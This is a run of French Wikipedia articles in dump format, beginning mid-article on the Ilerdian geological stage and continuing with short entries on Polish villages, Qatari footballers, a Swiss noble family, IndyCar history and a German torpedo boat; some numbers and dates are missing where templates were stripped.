Doncieux (1906, 1911) reconnaît cet étage dans les Corbières septentrionales et l'attribue au Cuiso-Lutétien. Il remarque dans le Lutétien à Fontcouverte et dans une dizaine d'autres gisements des Corbières septentrionales des plaques marginales d'astérides qu'il rapporte à un "Goniaster" proche de "Goniaster poritoides" Desm., et à un "Astropecten".
Valette (1925) décrit, dans le matériel recueilli par Lambert, en particulier à Fontcouverte, deux espèces nouvelles qu’il affecte, très correctement compte tenu des connaissances de l’époque, à deux genres, l'un fossile, l'autre actuel.
Avec l'élaboration d'une échelle chronostratigraphique fondée sur les biozones à et nummulites par Hottinger et Schaub en 1960, ces deux auteurs sont amenés à identifier l'Ilerdien comme entité stratigraphique basée sur ces formations marines.
Ils le placent, selon Bessière "et al." (1978) « entre le Sparnacien à " levis" et le Cuisien (biozone à " oblonga") » ;
ou, selon Breton &amp; Vizcaïno (1997) « entre le Thanétien () marin et le Cuisien ».
Mais en 1975 Bignot et Moorkens trouvent que seule la partie supérieure de l'Ilerdien coïncide avec l'Yprésien inférieur.
Selon Jean-Claude Plaziat (1970), le « calcaire basal » (de l'Ilerdien) surmonte les dépôts fluvio-lacustres du "Sparnacien" ; il dit aussi (1981, 1983), que l'Ilerdien correspond au Sparnacien moyen et supérieur et au Cuisien inférieur.
Son existence et sa présence en Languedoc ont animé des débats passionnés et engendré de nombreuses études. En 1997, Breton &amp; Vizcaïno le disent « aujourd'hui admis par la plupart des auteurs ».
Durée.
L'Yprésien durant de , si l'on considère une durée égale pour ses deux sous-divisions, l'Ilerdien durerait de et le Cuisien de .
Mais en 1975 Bignot et Moorkens trouvent que seule la partie supérieure de l'Ilerdien coïncide avec l'Yprésien inférieur.
Événement marquant.
Pour Cavelier "et al." (1997), le milieu de l'Ilerdien marque la fin de la progression vers l'est du bassin aquitain, avec l'océan s'avançant jusqu'à Béziers lors de cette troisième transgression marine — la première datant du Danien () et atteignant le Mas-d'Azil, la deuxième au Sélandien-Thanétien (respectivement et ) et atteignant les Corbières de l'est.
Stratigraphie.
Selon la définition de Hottinger et Schaub (1960), corroborée par les observations de nombreux auteurs subséquents, « l'Ilerdien désigne l'ensemble des couches nummulitiques paléocènes dans les Pyrénées orientales attribuées jusqu'ici au Lutétien inférieur et à l'Yprésien » ; il débuterait par la zone à "Alveolina cucumiformis", suivie par celle à "Alveolina corbarica" (marnes bleues) et se terminerait par la zone à "Alveolina trempina" (grès à huîtres).
Stratigraphie dans les Corbières.
La position de l'Ilerdien à l'extrême pointe de la transgression marine se retrouve dans sa stratigraphie ; ainsi cette série marine, qui avoisine les d'épaisseur dans les Corbières, y est caractérisée par une transgression marine brutale suivie d'une régression progressive. L'Ilerdien du mont Alaric, vers la frange nord des Corbières, donne la stratigraphie suivante (de bas en haut) :
Le niveau e3b, un calcaire à , est dit « calcaire à "" » et comprend trois niveaux :
Les niveaux que l'on retrouve sur la bordure nord du Mouthoumet sont en partie des équivalents latéraux des niveaux à ("O. subgranulosa") décrits ci-dessous.
Cette formation, qui atteint sur le flanc nord de l'Alaric puis sur le flanc sud (Pradelles-en-Val), n'a plus qu'une quinzaine de mètres sur la partie septentrionale du Mouthoumet.
Les niveaux e3c et e3d sont des marnes bleues à et des marnes bleues à turritelles.
Le niveau e3e est un grès à huîtres
Observations sur la chronologie des formations e3b, e3c, e3d et e3e :
La nomenclature classique de la carte géologique à 1/80 000 donnait la formation du calcaire à comme yprésienne, celle des marnes bleues et des grès à huîtres, comme étant d'âge lutétien inférieur.
Paris (1971) rapporte à l'Ilerdien supérieur (noté « e4d ») un ensemble géologique près de Mirepoix (hameau sur Montmaurin, Haute-Garonne), jusque là rapporté au Lutétien moyen, défini par la présence de "Lophiaspis baicheri" dans une molasse gréseuse dite « grès de Saint-Quentin » alternant avec des poudingues du type Palassou, le tout reposant sur de l'Ilerdien moyen.
Stratigraphie en Égypte.
La question de la différence entre Yprésien inférieur (ou Ilerdien) et Yprésien supérieur (ou Cuisien) se pose aussi ailleurs qu'en France, par exemple en Égypte. Keheila "et al." (1990), étudiant les formations carbonatées de l'Éocène inférieur à l'est de Qena et Sohag, y trouvent deux zones de foraminifères : 
La formation de Thèbes, qui correspond à l'Ilerdien, est caractérisée par :
Les formations de Thèbes et de Drunka ne se superposent pas régulièrement : au nord-ouest de la zone étudiée, le contact entre le milieu et la partie supérieure de la formation de Thèbes d'une part, et la formation de Drunka d'autre part, se présente comme les doigts croisés de deux mains. Par ailleurs, des diastèmes (surfaces d'érosion discontinue) apparaissent dans la formation de Thèbes, principalement au milieu de celle-ci où ils sont caractérisés par des couches de calcaires phosphatiques à gros grain allant jusqu'à d'épaisseur. Selon les auteurs, cette formation se serait déposée dans un environnement de marées sur fond plat et une circulation d'eau en partie restreinte, avec des bancs de nummulites déposés par des tempêtes. Dans des lits de shale, des foraminifères du Paléocène ("Planorotalites pseudomenardii", "Globorotalia compressa", "Planorotalites pusilla pusilla", "Morozovella uncinata", "Morozovella angulata", "Globigerina triloculinoides") sont remaniés et coexistent avec des ostracodes yprésiens ("Leguminocythereis" aff. "lokossaensis Apostolescu") ; ce qui suggère que la séquence du Paléocène, avec ses formanifères probablement originaires de la mer Rouge voisine, a pu être soulevée, subséquemment exposée à l'air libre et sujette à une sévère érosion pendant l'Yprésien inférieur. L'absence des couches du Paléogène correspondantes serait due à ce soulèvement important plutôt qu'à une absence de sédimentation.
Stratotype.
Le stratotype de l'Ilerdien moyen est aux lieux-dits Pech des Fourches et les Croisettes, inclus dans la coupe de Coustouge à Jonquières (Aude), à environ à l'ouest de Coustouge.
Il est marqué par une grande diversité des astérides cénozoïques.
Localisation.
On le trouve du nord-est de l'Espagne aux Corbières, où il est marqué par la présence de "", un foraminifère encroûtant (formant récifs) de la famille des .
Le « grès de Coudures ».
Le « grès de Coudures » ou « pierre de Coudures » (Landes), qui date de l'Ilerdien, est un grès quartzitique très dur, à cassure blanche ou rosée, qui se présente sous forme de blocs allongés de .
Localement cette pierre est appelée "peyre d'azou" (pierre d'âne) car elle considérée comme impropre à la construction.
Mais elle était exploitée autrefois pour faire des pavés, 
notamment à l'ouest de Coudures en rive droite du Gabas ; en aval de Sainte-Colombe dans les bois proches de Mounon ; et au nord-ouest de Saint-Aubin.

</doc>
<doc id="8979149" url="https://fr.wikipedia.org/wiki?curid=8979149" title="Sentenza di morte">
Sentenza di morte



</doc>
<doc id="8979150" url="https://fr.wikipedia.org/wiki?curid=8979150" title="Khéops (rocher)">
Khéops (rocher)



</doc>
<doc id="8979151" url="https://fr.wikipedia.org/wiki?curid=8979151" title="Death Sentence">
Death Sentence

Death Sentence est :

</doc>
<doc id="8979153" url="https://fr.wikipedia.org/wiki?curid=8979153" title="Quartier Saint-Martin (Rennes)">
Quartier Saint-Martin (Rennes)



</doc>
<doc id="8979155" url="https://fr.wikipedia.org/wiki?curid=8979155" title="1870 en Bretagne">
1870 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1870 en Bretagne.

</doc>
<doc id="8979156" url="https://fr.wikipedia.org/wiki?curid=8979156" title="Agua Caliente (Salvador)">
Agua Caliente (Salvador)

Agua Caliente est l'une des municipalités du département de Chalatenango au Salvador.
La municipalité est située à 70 kilomètres de San Salvador et 45 kilomètres de la capitale du département de Chalatenango ; elle a le titre de « villa », mais il n'y a pas de documentation sur la date exacte de cette attribution, sauf que depuis le début du siècle on la mentionne dans les documents officiels.
Selon le recensement de 2007 le village a habitants dont une majorité (plus de 75 %) vit dans les zones rurales.

</doc>
<doc id="8979159" url="https://fr.wikipedia.org/wiki?curid=8979159" title="Gizeh (groupe de rochers)">
Gizeh (groupe de rochers)



</doc>
<doc id="8979164" url="https://fr.wikipedia.org/wiki?curid=8979164" title="Chm">
Chm



</doc>
<doc id="8979165" url="https://fr.wikipedia.org/wiki?curid=8979165" title="Saint Joseph (Ribera)">
Saint Joseph (Ribera)

 
Saint Joseph est une peinture de José de Ribera datant de 1635 environ, conservée au musée des beaux-arts de Montréal.
Histoire.
Le tableau entre dans le musée par le legs William J. Morrice en 1943 dans la collection Art international ancien et moderne du MBAM, maintenant installée dans le pavillon Jean-Noël Desmarais au niveau 4.
Iconographie.
Saint Joseph est reconnaissable (en dehors de sa présence évidente dans la Nativité de Jésus) par son attribut, un bâton fleuri, visible également dans les représentations de son mariage avec la Vierge Marie, fleurs qui le font reconnaître comme prétendant accepté. 
Description.
Joseph, âgé, barbu, est vu en buste tourné à dextre mais seuls son visage (tourné vers le ciel) et sa main se distinguent de la noirceur du fond et du ténébrisme du décor. On aperçoit au-dessus de la main quelques fleurs que l'on imagine au bout de son bâton.
Analyse.
Ce tableau reprend le principe de composition de sa série des portraits des douze apôtres dite "Apostolado" (thème en vigueur alors en Flandres et en Espagne).
Le même thème (personnage et posture) a été traité plusieurs fois (dans un style assez différent) par Ribera dont une peinture conservée au Brooklyn Museum de New York.

</doc>
<doc id="8979170" url="https://fr.wikipedia.org/wiki?curid=8979170" title="Saoud Fath">
Saoud Fath

Saoud Fath (né le au Qatar) est un joueur de football international qatarien, qui évoluait au poste de défenseur.
Biographie.
Carrière en sélection.
Avec l'équipe du Qatar, il joue 40 matchs (pour aucun but inscrit) entre 1997 et 2004. 
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2000 et de 2004. Il atteint les quarts de finale de cette compétition en 2000.
Il joue également 17 matchs comptant pour les tours préliminaires de la coupe du monde, lors des éditions 1998, 2002 et 2006.

</doc>
<doc id="8979172" url="https://fr.wikipedia.org/wiki?curid=8979172" title="Famille de Maillardoz">
Famille de Maillardoz

La famille de Maillardoz est une famille noble originaire de Rue dans le canton de Fribourg.
Histoire.
La famille de Maillardoz est originaire de Rue dans le canton de Fribourg. 
Le premier membre cité de la famille est Ulrich en 1230.
En 1607, elle est reçue dans la bourgeoisie de Fribourg.
François Pierre Nicolas et Jean Pierre Philippe Ignace ont été avoyers de Fribourg. Le premier occupe ce poste de 1794 à 1796. Son père, François Nicolas a été membre du Petit Conseil. Le second est en poste de 1810 à 1813.
Nicolas de Maillardoz est bailli de Surpierre en 1631. Henri de Mailliardoz occupe le même poste en 1718.
Possessions.
Cette famille a possédé la maison Maillardoz, ainsi que des biens à Rue, Arlens, Blessens, Chapelle (Glâne), Ecublens, La Joux, Montet (Glâne), Morlens, Promasens et Ursy.
Personnalités.
La famille compte plusieurs membres du Petit Conseil (dès 1691), du Conseil d'Etat, des Soixante (dès 1654) et du Grand Conseil (dès 1650), ainsi que des baillis, deux bourgmestres et des secrétaires du Conseil, ainsi que des religieux, dont :
Armoiries.
Les armoiries des Maillardoz se blasonnent ainsi : "une bande chargée de deux maillets." ("Armorial du canton de Fribourg", 1935)
On retrouve ces armes sur une clef de voute dans une maison de Rue et datant de la fin du . On les retrouve sur des sceaux, des sculptures, sur ou dans des maisons (Rue, Grandvaux)
Les émaux : "D'argent à la bande d'azur chargée de deux maillets d'or" sont connus à cette même période.
Une grosse de Rue, datée de 1482, a été réalisée en faveur de Jean Antoine Maillardoz. Elle porte comme cimier "un évêque issant tenant de ses deux mains un maillet d'or posé en bande, coiffé d'une mitre d'azur retroussé d'hermine, habillé des couleurs et partitions de l'écu, ayant sur les épaules un velum aux mêmes armes, doublé de couleur olivâtre".
L'auteur de l"'Armorial du canton de Fribourg" ajoute cependant que les membres de la famille porte "un sauvage issant tenant" tantôt "deux maillets", tantôt "un maillet".

</doc>
<doc id="8979177" url="https://fr.wikipedia.org/wiki?curid=8979177" title="Mont Yoko (Yatsugatake septentrional)">
Mont Yoko (Yatsugatake septentrional)

Le , aussi appelé mont Kita Yoko, est un dôme de lave actif situé dans le groupe volcanique septentrional de Yatsugatake des monts Yatsugatake sur l'île de Honshū au Japon. Le mont Yoko, qui a montré une activité très récente, est considéré comme un volcan actif. Sa dernière éruption date d'environ 800 ans. L'éruption se composait de cendres avec une coulée de lave de quelque 3 millions de mètres cubes. L'éruption a été datée par radiocarbone. L'éruption précédente est postérieure à 400 

</doc>
<doc id="8979182" url="https://fr.wikipedia.org/wiki?curid=8979182" title="Alphonse de Chavanges">
Alphonse de Chavanges

Alphonse de Bourlon, dit le baron Alphonse de Chavanges (Paris, - Paris, ), est un militaire et auteur dramatique français.
Biographie.
Beau-frère et aide-de-camp du maréchal Augereau, colonel et chef de bataillon, ses pièces ont été représentées sur les plus grandes scènes parisiennes du : Théâtre de la Porte-Saint-Martin, Théâtre de l'Ambigu-Comique, Théâtre du Vaudeville, etc.
Il est enterré au cimetière du Père-Lachaise ( division).

</doc>
<doc id="8979183" url="https://fr.wikipedia.org/wiki?curid=8979183" title="Jaroslav Kraus">
Jaroslav Kraus

Jaroslav Kraus (-?) est un footballeur tchécoslovaque et international bohémien, évoluant au poste de gardien de but.
Biographie.
Joueur du FK Viktoria Žižkov, Jaroslav Kraus honore sa première et seule sélection avec l'équipe de Bohême-Moravie le contre l'Ostmark (5-5).

</doc>
<doc id="8979185" url="https://fr.wikipedia.org/wiki?curid=8979185" title="1871 en Bretagne">
1871 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1871 en Bretagne.

</doc>
<doc id="8979186" url="https://fr.wikipedia.org/wiki?curid=8979186" title="Famille Maillardoz">
Famille Maillardoz



</doc>
<doc id="8979192" url="https://fr.wikipedia.org/wiki?curid=8979192" title="Star Wars Battle Pod">
Star Wars Battle Pod



</doc>
<doc id="8979193" url="https://fr.wikipedia.org/wiki?curid=8979193" title="Unité urbaine de Lavelanet">
Unité urbaine de Lavelanet

L'unité urbaine de Lavelanet est une unité urbaine française centrée sur la ville de Lavelanet, dans le département de l'Ariège, en région Occitanie.
Données générales.
Dans le zonage réalisé par l'Insee en 2010, l'unité urbaine était composée de quatre communes.
Dans le nouveau zonage réalisé en 2020, elle est composée des quatre mêmes communes.
En , avec , elle représente la unité urbaine du département de l'Ariège.
En 2021, sa densité de population s'élève à . Par sa superficie, elle représente 0,6 % du territoire départemental mais, par sa population, elle regroupe 4,5 % de la population du département de l'Ariège.
Composition 2020 de l'unité urbaine.
Elle est composée des quatre communes suivantes :

</doc>
<doc id="8979195" url="https://fr.wikipedia.org/wiki?curid=8979195" title="Battle Pod">
Battle Pod



</doc>
<doc id="8979198" url="https://fr.wikipedia.org/wiki?curid=8979198" title="Fear The Walking Dead">
Fear The Walking Dead



</doc>
<doc id="8979202" url="https://fr.wikipedia.org/wiki?curid=8979202" title="The Light of Egypt">
The Light of Egypt

The Light of Egypt, dans son titre complet The Light of Egypt, or, the science of the soul and the stars, est un ouvrage en 2 volumes paru en 1889. Son auteur, Thomas H. Burgoyne, y compila la totalité de la doctrine de la Fraternité Hermétique de Louxor, société secrète dont il fut un membre fondateur et le secrétaire de 1884 à 1888.
Ce livre clivant, dont la parution et le contenu seront commentés dans les journaux spécialisés de l'époque, suscita de nombreuses réactions tant positives que négatives dans les milieux occultiste et intellectuel de l'époque. En France, c'est à travers cet écrit que les grandes figures de l'occultisme de la belle époque telles Papus, F.-Ch. Barlet ou Sédir s'interesseront à l'occultisme.
Aux États-Unis il servira de référence pour des groupements spirituels californiens, eux-mêmes précurseur de ce qui deviendra plus tard le mouvement New Age. Burgoyne fondera en Californie la "Church of Light", secte basée sur cet écrit, qui connaitra une vive expansion et existe toujours aujourd'hui.
Les partisans de la société théosophique verront dans ce livre une attaque dangereuse contre la spiritualité et une escroquerie.

</doc>
<doc id="8979207" url="https://fr.wikipedia.org/wiki?curid=8979207" title="Pweevo">
Pweevo



</doc>
<doc id="8979213" url="https://fr.wikipedia.org/wiki?curid=8979213" title="1872 en Bretagne">
1872 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1872 en Bretagne.

</doc>
<doc id="8979220" url="https://fr.wikipedia.org/wiki?curid=8979220" title="Waleed Hamzah">
Waleed Hamzah

Waleed Hamzah Rasoul Al Bloushi (né le au Qatar) est un joueur de football international qatarien d'origine pakisanaise, qui évolue au poste d'attaquant.
Biographie.
Carrière en sélection.
Avec l'équipe du Qatar, il joue 40 matchs (pour 9 buts inscrits) entre 2000 et 2008. 
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2000 et de 2004. Il atteint les quarts de finale de cette compétition lors de l'année 2000.
Il joue également 15 matchs comptant pour les tours préliminaires de la coupe du monde, lors des éditions 2002, 2006 et .
Il participe enfin à la Coupe du monde des moins de 17 ans 1999 organisée en Nouvelle-Zélande.

</doc>
<doc id="8979222" url="https://fr.wikipedia.org/wiki?curid=8979222" title="Sportine Aviacija LAK-20">
Sportine Aviacija LAK-20

Le LAK-20 est un planeur biplace de classe Open produit par Sportinė Aviacija.

</doc>
<doc id="8979226" url="https://fr.wikipedia.org/wiki?curid=8979226" title="Vojtěch Věchet">
Vojtěch Věchet

Vojtěch Věchet, né le et mort le , est un footballeur international tchécoslovaque et international bohémien, évoluant au poste de gardien de but.
Biographie.
Joueur de l'AC Sparta Prague, Vojtěch Věchet fait ses débuts internationaux avec la Tchécoslovaquie contre la Lettonie, et joue quatre matchs entre 1937 et 1938. Après l'annexion de la Tchécoslovaquie par le troisième Reich, il joue un match en 1939 pour l'équipe de Bohême-Moravie, qui succède à celle de la Tchécoslovaquie, contre la Yougoslavie (7-3).
Avec le Sparta Prague, il est sacré double champion de Tchécoslovaquie en 1938 et 1939.

</doc>
<doc id="8979228" url="https://fr.wikipedia.org/wiki?curid=8979228" title="Agua Caliente, El Salvador">
Agua Caliente, El Salvador



</doc>
<doc id="8979232" url="https://fr.wikipedia.org/wiki?curid=8979232" title="Prix littéraire">
Prix littéraire



</doc>
<doc id="8979235" url="https://fr.wikipedia.org/wiki?curid=8979235" title="1873 en Bretagne">
1873 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1873 en Bretagne.

</doc>
<doc id="8979236" url="https://fr.wikipedia.org/wiki?curid=8979236" title="Milejowice (Mazovie)">
Milejowice (Mazovie)

Milejowice (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'est de Zakrzew (siège de la gmina), au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979240" url="https://fr.wikipedia.org/wiki?curid=8979240" title="Milejowice">
Milejowice

En Pologne, Milejowice peut désigner :

</doc>
<doc id="8979242" url="https://fr.wikipedia.org/wiki?curid=8979242" title="Aire urbaine de Lavelanet">
Aire urbaine de Lavelanet

L'aire urbaine de Lavelanet est une aire urbaine française centrée sur la ville de Lavelanet.
Caractéristiques.
D'après la définition qu'en donne l'INSEE, l'aire urbaine de Lavelanet est composée de communes, situées dans l'Ariège.
Toutes les communes font partie de l'unité urbaine de Lavelanet
En 2020, l'Insee définit un nouveau zonage d'étude : les aires d'attraction des villes. L'aire d'attraction de Lavelanet remplace désormais son aire urbaine, avec un périmètre différent.
Communes.
Liste des communes appartenant à l'aire urbaine de Lavelanet selon la nouvelle délimitation de 2010 et sa population municipale en 2010 (liste établie par ordre alphabétique) :
Évolution démographique.
L'évolution démographique ci-dessous concerne l'unité urbaine selon le périmètre défini en 2010.

</doc>
<doc id="8979243" url="https://fr.wikipedia.org/wiki?curid=8979243" title="Peter Wilkinson">
Peter Wilkinson

Peter Wilkinson peut désigner :

</doc>
<doc id="8979247" url="https://fr.wikipedia.org/wiki?curid=8979247" title="Alcazar (cabaret)">
Alcazar (cabaret)



</doc>
<doc id="8979252" url="https://fr.wikipedia.org/wiki?curid=8979252" title="Championnat américain de course automobile">
Championnat américain de course automobile

Le championnat américain de course automobile (en anglais : American Championship car racing), également nommé aujourd'hui IndyCar Series est une compétition de course automobile se déroulant majoritairement aux États-Unis. En 2015, le championnat est géré par l'IndyCar.
Depuis 1902, des courses se déroulent aux États-Unis et en 1905, le National Championship (Championnat National en français) récompense le meilleur pilote. Les 500 miles d'Indianapolis, dont la première édition se tient en 1911, est l'événement phare du championnat.
Les monoplaces pouvant participer rentrent dans la catégorie des monoplaces de Formule Indy (ou IndyCar) et sont généralement similaires à ceux de la Formule 1, malgré quelques différences.
Historique.
AAA (1902-1955).
Le Championnat National fut, à ses débuts, organisé par l'Association américaine des automobilistes (AAA). En 1902, l'AAA utilise les règles de l'Automobile Club de l'Amérique (ACA), mais à partir de 1903 instaure ses propres règles de course et inaugure une première saison de championnat pour voitures de course en 1905. Barney Oldfield fut le premier vainqueur. Durant la période 1906-1915, de simples courses eurent lieu sans être regroupées au sein d'un championnat unique. Des documents officiels considèrent l'année 1916 comme la deuxième saison de championnat. Des années plus tard, rétrospectivement, des titres furent décernés pour les périodes 1902-1904, 1906-1915, et 1917-1919 mais sont considérés comme non officiels par les historiens accrédités.
Les courses n'ont pas cessé aux États-Unis au cours de la Première Guerre mondiale, mais le Championnat National fut suspendu, ainsi que les d'Indianapolis, lors des années 1917-1918 à cause de la guerre. En 1920, le championnat a repris officiellement malgré le climat économique difficile de la Grande Dépression. Peu de temps après l'attaque de Pearl Harbor, toutes les courses automobiles ont été suspendues pendant la Seconde Guerre mondiale. De 1942 à 1945 aucun événement n'a eu lieu, notamment à cause de l'interdiction faite par le gouvernement des États-Unis pour des raisons de rationnement. La compétition est relancée en 1946.
L'AAA cesse de participer aux compétitions automobiles à la fin de la saison 1955 à la suite d'une série d'accidents mortels, tel que celui de Bill Vukovich à Indianapolis, et à l'accident des 24 Heures du Mans 1955.
USAC (1956-1978).
Le Championnat National fut repris par le United States Auto Club (USAC), un nouvel organisme dirigé par le propriétaire de l'Indianapolis Motor Speedway, Tony Hulman. Le Championnat continua de croître en popularité dans un environnement stabilisé depuis plus de deux décennies, avec les deux disciplines traditionnelles sur pistes ovales pavées ou en terre. Durant les années 1950, les Indy Roadsters sont les voitures dominantes sur pavés, tandis que Champ Cars "upright" dominent les pistes en terre. Dans les années 1960, les conducteurs et les propriétaires des équipes commencent à utiliser les voitures de série de type roadster avec le moteur situé à l'avant, ou des monoplaces avec le moteur à l'arrière. La technologie, la vitesse, et les dépenses augmentent rapidement à cette époque. Les pistes ovales continues d'être majoritaires, mais quelques courses sur route sont ajoutées.
Durant les années 1970, l'augmentation des coûts conduit une partie des propriétaires à quitter le sport. Les équipes dominantes sont à cette époque Penske, Patrick, Gurney et McLaren, toutes dirigées par des personnes ayant des antécédents de course sur route. À la suite des nombreux désaccords entre ces équipes et l'USAC, les événements autre que l'Indianapolis 500 souffrent d'une faible fréquentation et ont peu ou pas de couverture à la télévision.
À la fin de la décennie, plusieurs propriétaires envisagent la création d'un nouvel organisme. À la suite de la mort de Tony Hulman président de l'Indianapolis Motor Speedway et fondateur de l'USAC, à l'automne 1977. et la mort de huit fonctionnaires importants de l'USAC tués dans un accident d'avion à la fin de 1978, les propriétaires fondent le Championship Auto Racing Team (CART).
CART &amp; USAC (1979-2004).
Le Championship Auto Racing Teams formé par la plupart des propriétaires d'équipes existantes, est aidé à ses débuts par le Sports Car Club of America. Par conséquent, deux championnats nationaux se déroulent simultanément gérés par l'USAC d'un côté et le CART de l'autre, l'Indianapolis 500 restant sanctionné par l'USAC. Les meilleures équipes étant dans le championnat CART, celui-ci devint rapidement le championnat national le plus prestigieux. En 1979, à la suite d'une décision de justice les équipes de CART sont autorisées à évoluer durant l'Indy 500.
En 1980, USAC et CART tentent de regrouper les courses dans le Championnat Racing League (CRL), mais la direction de l'Indianapolis Motor Speedway rejette cette idée. En 1981-1982, l'Indianapolis 500 reste sanctionné par l'USAC, mais le championnat national prééminent était maintenant celui du CART. À partir de 1985, les d'Indianapolis restent la seule épreuve comptant pour le championnat USAC : le vainqueur de cette course reçoit ainsi le titre de Champion.
En 1996, Tony George petit-fils de Tony Hulman, président de l'Indianapolis Motor Speedway crée l'Indy Racing League (IRL) qui remplace l'USAC afin d'établir un championnat censé relever la renommée de l'Indianapolis 500, qui voit l'exclusion de nombreuses équipes CART cette année-là.
En , le CART porte plainte contre l'Indianapolis Motor Speedway afin de protéger leur licence pour la marque IndyCar que l'Indianapolis Motor Speedway tentait de suspendre. En avril, l'IMS dépose une plainte contre le CART pour les empêcher de continuer à utiliser la marque. Finalement, un accord a été conclu dans laquelle la CART accepte de renoncer à utiliser la marque IndyCar mais que l'IRL ne peut pas l'utiliser avant la fin de la saison 2002.
Le Championnat CART reste dominant mais à partir de 2000, les équipes commencent à revenir à l'Indy 500. Le CART souffre d'une publicité négative à la suite de l'annulation de la Firestone Firehawk 600 en 2001.
IndyCar Series &amp; Champ Car World Series (2004-2007).
Les droits du CART sont achetés par un consortium appelé Open Wheel Racing Series (OWRS) en 2004 et le championnat est rebaptisé Champ Car Open Wheel Racing Series, et plus tard, Champ Car World Series. Cependant, l'organisme continue d'être en proie à des difficultés financières, En 2007, les principaux sponsors de la CCWS Bridgestone et Ford Motor Company annoncent qu'ils se retireront pour la saison 2008.
Pendant ce temps, l'IRL fonctionne maintenant sous le nom de l'IndyCar Series.
IndyCar Series (à partir de 2008).
Avant le début de la saison 2008, le CCWS fait faillite et est absorbé dans l'IRL, ce qui conduit à la réunification du championnat national pour la première fois depuis 1978, sous le nom IndyCar Series.
Caractéristiques techniques.
Châssis.
À partir de 2012, le seul châssis autorisé est celui la .
Moteur.
Les moteurs sont des V6 2,2 L turbo ou biturbo qui fonctionnent à l'éthanol. Depuis le retrait de Lotus en 2013, seul Chevrolet et Honda équipent les monoplaces.
Pneumatiques.
Le manufacturier américain Firestone fournit toutes les écuries en pneumatiques
Articles connexes.
Quinté de tête

</doc>
<doc id="8979255" url="https://fr.wikipedia.org/wiki?curid=8979255" title="Mleczków">
Mleczków

Mleczków (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-est de Zakrzew (siège de la "gmina"), au nord-ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 644 en 2008.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979256" url="https://fr.wikipedia.org/wiki?curid=8979256" title="Natalin (Radom)">
Natalin (Radom)

Natalin (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979262" url="https://fr.wikipedia.org/wiki?curid=8979262" title="Nieczatów">
Nieczatów

Nieczatów (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979263" url="https://fr.wikipedia.org/wiki?curid=8979263" title="Witley">
Witley

Witley est une ville de habitants située dans le district de Waverley, dans le Surrey.

</doc>
<doc id="8979264" url="https://fr.wikipedia.org/wiki?curid=8979264" title="Podlesie Mleczkowskie">
Podlesie Mleczkowskie

Podlesie Mleczkowskie (prononciation : ) est un village polonais de la "gmina" de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979272" url="https://fr.wikipedia.org/wiki?curid=8979272" title="1874 en Bretagne">
1874 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1874 en Bretagne.

</doc>
<doc id="8979274" url="https://fr.wikipedia.org/wiki?curid=8979274" title="Torrent San Marino">
Torrent San Marino



</doc>
<doc id="8979276" url="https://fr.wikipedia.org/wiki?curid=8979276" title="Iltis (1927)">
Iltis (1927)

L'Iltis est un torpilleur de la classe Type 1924 de la Reichsmarine puis de la Kriegsmarine.
Histoire.
L"'Iltis" est construit en même temps que le "Wolf". Les deux bateaux sont lancés par l'amiral Wilhelm von Lans qui commandait le "SMS Iltis" durant la révolte des Boxers.
En 1930, il participe à un voyage en mer Méditerranée puis est du au dans les eaux norvégiennes. Le , il est désarmé, son équipage est transféré sur le "Wolf".
Il revient en . Son équipage provient du "Leopard". À l'été 1933, il va à Helsinki et à Riga puis dans les eaux suédoises. En , en compagnie du "Tiger", il va dans les eaux espagnoles pour remplacer le "Kondor" et le "Möwe". Il revient en octobre en Allemagne pour se réunir à l'escadre qui tentera de délivrer le fasciste José Antonio Primo de Rivera. En décembre, le torpilleur repart en Allemagne. Le , il revient en Espagne puis est désarmé en juillet.
Le , l"'Iltis" est remis en service. Avec le "Tiger" et le "Wolf", il forme la de torpilleurs qui est présente de mars à juillet 1938 dans les eaux espagnoles. En , il participe avec d'autres navires allemands à l'intégration du territoire de Memel dans le Troisième Reich.
Après le déclenchement de la Seconde Guerre mondiale, l"Iltis" pose des mines dans le cadre de la guerre de course en mer du Nord ainsi que des missions d'escorte. Le , il protège en compagnie de plusieurs destroyers les croiseurs "Nürnberg" et "Köln" dans l'estuaire de la Tamise. À son retour, le navire part en chantier, il ne participe pas à l'opération Weserübung. Le , l"'Iltis" et quatre autres torpilleurs escortent le "Gneisenau" endommagé de Norvège à Kiel. Il pose ensuite des mines.
En , le torpilleur vient en France. Dans le port du Havre, il est atteint par une bombe le . Six membres d'équipage meurent, sept autres sont blessés. Après des réparations dans le port de Cherbourg, il pose des mines de à . En février, il escorte l"'Admiral Hipper". Les 21 et , le torpilleur et le "Jaguar" escortent depuis Brest le "Gneisenau" et le "Scharnhorst" qui reviennent de l'opération Berlin.
